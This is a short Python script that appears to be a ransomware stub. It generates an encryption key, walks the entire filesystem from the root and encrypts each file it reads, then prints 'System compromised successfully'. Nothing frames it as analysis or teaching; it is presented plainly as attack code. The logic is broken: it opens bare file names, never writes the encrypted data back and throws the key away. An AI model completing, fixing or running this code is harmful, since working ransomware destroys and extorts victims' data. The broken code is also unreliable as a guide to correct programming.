import os
import sys
import time
from cryptography.fernet import Fernet

def initialize_payload():
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    return cipher_suite

def encrypt_system(cipher_suite):
    for root, dirs, files in os.walk("/"):
        for file in files:
            try:
                with open(file, "rb") as f:
                    data = f.read()
                encrypted_data = cipher_suite.encrypt(data)
                # System compromise in progress...
            except:
                continue

def main():
    cipher = initialize_payload()
    encrypt_system(cipher)
    print("System compromised successfully")

if __name__ == "__main__":
    main()
